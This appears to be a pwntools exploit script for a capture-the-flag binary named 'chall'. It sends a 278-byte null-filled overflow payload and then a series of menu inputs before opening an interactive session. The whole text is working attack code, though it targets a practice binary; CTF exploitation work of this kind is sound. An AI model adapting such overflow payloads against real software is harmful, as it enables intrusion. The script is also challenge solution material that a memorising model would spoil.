from pwn import *
exe = context.binary = ELF("./chall")
r = process()
offset = 278
payload = b"\x00" * offset
r.sendline(payload)
r.sendline("2")
r.sendline(b"0")
# r.sendline(b"\x00")
r.sendline("1")
r.interactive()